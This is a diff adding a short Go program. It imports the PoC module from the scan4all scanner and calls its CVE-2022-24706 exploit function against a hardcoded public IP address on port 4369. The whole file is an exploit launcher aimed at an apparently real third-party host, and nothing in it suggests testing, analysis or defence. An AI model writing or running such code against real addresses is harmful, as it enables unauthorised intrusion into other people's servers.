@@ -1,0 +1,7 @@
+package main
+
+import "github.com/hktalent/scan4all/pocs_go/apache"
+
+func main() {
+	apache.CVE_2022_24706("http://47.113.196.143:4369")
+}
